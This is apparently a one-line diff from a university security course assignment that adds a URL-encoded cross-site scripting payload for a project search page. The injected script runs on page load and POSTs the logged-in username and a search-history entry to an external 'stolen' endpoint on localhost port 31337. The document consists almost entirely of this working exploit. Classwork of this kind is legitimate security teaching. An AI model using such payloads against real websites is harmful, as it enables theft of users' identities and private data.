@@ -1,0 +1,2 @@
+
+https://comp427.rice.edu/proj2/search?q=%3Cscript%3E+window.onload%3D%28e%29%3D%3E{%24.ajax%28{type%3A+%60POST%60%2Curl%3A+%60https%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%60%2Bdocument.getElementById%28%60logged-in-user%60%29.textContent%2B%60%26last_search%3D%60%2Bdocument.getElementsByClassName%28%60history-item+list-group-item%60%29[1].textContent}%29}%3C%2Fscript%3E
